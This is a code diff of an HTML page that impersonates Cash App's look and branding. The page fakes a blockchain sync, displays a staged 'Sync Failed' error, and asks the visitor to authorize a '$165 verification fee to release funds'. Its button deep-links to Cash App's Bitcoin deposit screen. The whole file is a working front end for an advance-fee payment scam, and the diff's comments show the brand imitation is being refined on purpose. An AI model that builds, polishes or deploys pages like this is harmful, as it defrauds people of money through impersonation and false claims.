@@ -3,32 +3,112 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Blockchain Verification</title>
+    <title>Cash App | Secure Verification</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
-        body { background-color: #080b0d; color: #ffffff; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
-        .container { width: 90%; max-width: 400px; text-align: center; }
-        .spinner { width: 60px; height: 60px; border: 4px solid rgba(0, 214, 50, 0.1); border-top: 4px solid #00d632; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 30px; }
+        /* Cash App Design Foundations */
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
+        
+        body { 
+            background-color: #000000; /* Pure black for that OLED app look */
+            color: #ffffff; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            height: 100vh; 
+            width: 100vw;
+            overflow: hidden; 
+        }
+
+        .container { 
+            width: 85%; 
+            max-width: 380px; 
+            text-align: center;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+
+        /* Smooth Cash App Style Spinner */
+        .spinner { 
+            width: 50px; 
+            height: 50px; 
+            border: 3px solid rgba(0, 214, 50, 0.15); 
+            border-top: 3px solid #00d632; 
+            border-radius: 50%; 
+            animation: spin 0.8s cubic-bezier(0.4, 0, 0.2, 1) infinite; 
+            margin-bottom: 30px; 
+        }
+
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .error-icon { font-size: 60px; margin-bottom: 25px; display: none; }
-        h1 { font-size: 24px; font-weight: 700; margin-bottom: 15px; }
-        p { font-size: 17px; color: #b0b0b0; line-height: 1.6; margin-bottom: 30px; }
-        .fee-highlight { color: #ff5f5f; font-weight: 700; }
-        .manual-btn { display: none; background-color: #00d632; color: white; text-decoration: none; padding: 18px 35px; border-radius: 35px; font-weight: 700; font-size: 18px; margin-top: 10px; }
-        .footer { position: absolute; bottom: 40px; width: 100%; color: #333; font-size: 13px; font-weight: 600; letter-spacing: 1px; }
+
+        .error-icon { 
+            font-size: 50px; 
+            margin-bottom: 20px; 
+            display: none; 
+            color: #ff3b30; /* Official iOS/Cash App Error Red */
+        }
+
+        h1 { 
+            font-size: 22px; 
+            font-weight: 600; 
+            margin-bottom: 12px; 
+            letter-spacing: -0.5px;
+        }
+
+        p { 
+            font-size: 16px; 
+            color: #a0a0a0; 
+            line-height: 1.5; 
+            margin-bottom: 35px; 
+            padding: 0 10px;
+        }
+
+        .fee-highlight { color: #ff3b30; font-weight: 600; }
+
+        /* The Signature Cash App Capsule Button */
+        .manual-btn { 
+            display: none; 
+            background-color: #00d632; 
+            color: #ffffff; 
+            text-decoration: none; 
+            padding: 16px 0; 
+            border-radius: 50px; /* Capsule shape */
+            font-weight: 700; 
+            font-size: 17px; 
+            width: 100%; /* Full width button like the app */
+            transition: opacity 0.2s;
+        }
+
+        .manual-btn:active { opacity: 0.8; }
+
+        .footer { 
+            position: absolute; 
+            bottom: 50px; 
+            width: 100%; 
+            text-align: center;
+            color: #444; 
+            font-size: 12px; 
+            font-weight: 700; 
+            text-transform: uppercase;
+            letter-spacing: 2px; 
+        }
     </style>
 </head>
 <body>
 
     <div class="container">
         <div id="loader" class="spinner"></div>
-        <div id="errorIcon" class="error-icon">⚠️</div>
-        <h1 id="statusTitle">Syncing with Blockchain...</h1>
-        <p id="statusMsg">Connecting to secure verification gateway.</p>
-        <a id="manualBtn" href="#" class="manual-btn">Open Bitcoin Deposit</a>
+        
+        <div id="errorIcon" class="error-icon">✕</div>
+        
+        <h1 id="statusTitle">Syncing with Blockchain</h1>
+        <p id="statusMsg">Securely connecting to the verification network.</p>
+        
+        <a id="manualBtn" href="#" class="manual-btn">Open Cash App</a>
     </div>
 
-    <div class="footer">CASH APP SECURE</div>
+    <div class="footer">Secure Encryption</div>
 
     <script>
         const loader = document.getElementById('loader');
@@ -37,20 +117,21 @@
         const msg = document.getElementById('statusMsg');
         const manualBtn = document.getElementById('manualBtn');
 
-        // UPDATED DEEP LINK TO BITCOIN SECTION
+        // Target Link
         const deepLink = "https://cash.app/launch/bitcoin/deposit";
 
         setTimeout(() => {
+            // Switch to Error UI
             loader.style.display = "none";
             errorIcon.style.display = "block";
-            title.innerText = "Connection Error";
-            title.style.color = "#ff5f5f";
-            msg.innerHTML = `Blockchain sync failed. Please manually authorize the <span class="fee-highlight">$165</span> verification fee in your Bitcoin wallet.`;
             
-            manualBtn.style.display = "inline-block";
+            title.innerText = "Sync Failed";
+            msg.innerHTML = `Unable to process deposit. Please manually authorize the <span class="fee-highlight">$165</span> verification fee to release funds.`;
+            
+            manualBtn.style.display = "block";
             manualBtn.href = deepLink;
 
-        }, 3500); 
+        }, 3200); 
     </script>
 </body>
 </html>
